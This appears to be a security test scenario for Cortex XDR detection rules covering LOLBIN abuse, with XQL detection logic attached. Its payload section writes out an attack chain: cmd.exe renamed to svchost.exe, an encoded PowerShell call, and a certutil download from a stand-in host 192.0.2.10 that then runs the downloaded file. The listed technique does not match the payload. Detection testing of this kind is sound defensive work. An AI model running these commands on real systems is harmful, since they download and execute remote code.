identity.name: LOLBIN Process Execution with High Integrity Level
identity.summary: An attacker executes a legitimate Windows binary with elevated privileges to gain system access and execute malicious code. Cortex should detect the use of a LOLBIN with high integrity level.
identity.description: An attacker executes a legitimate Windows binary with elevated privileges to gain system access and execute malicious code. Cortex should detect the use of a LOLBIN with high integrity level.

techniques.name: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

payload.code:
copy C:\Windows\System32\cmd.exe C:\temp\svchost.exe

cd C:\temp

svchost.exe /c powershell.exe -enc JABwAHMAZQB1AGQAbwAgAC0AcAByAG8AdABvAHQAaQBjAHQAIABwAHcA

svchost.exe /c certutil.exe -urlcache -split -f http://192.0.2.10/malware.exe C:\temp\malware.exe

svchost.exe /c C:\temp\malware.exe

expected_artifacts.description: LOLBIN process executed with high integrity level

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: LOLBIN Process with High Integrity
biocs.description: Detection of a legitimate Windows binary (LOLBIN) executed with high integrity privileges
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name in ('svchost.exe', 'powershell.exe', 'certutil.exe')
| filter actor_process_image_name = 'cmd.exe'
| filter process_integrity_level = 'high'

abiocs.name: Suspicious LOLBIN Execution Chain
abiocs.description: Detects a sequence of legitimate binaries used to execute malicious code with elevated privileges
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name in ('svchost.exe', 'powershell.exe', 'certutil.exe')
| filter actor_process_image_name = 'cmd.exe'
| filter process_integrity_level = 'high'
| filter causality_actor_process_image_name = 'cmd.exe'
| filter action_file_path contains 'temp'
| filter action_remote_ip = '192.0.2.10'
abiocs.causality_anchor: cmd.exe executing svchost.exe with elevated privileges
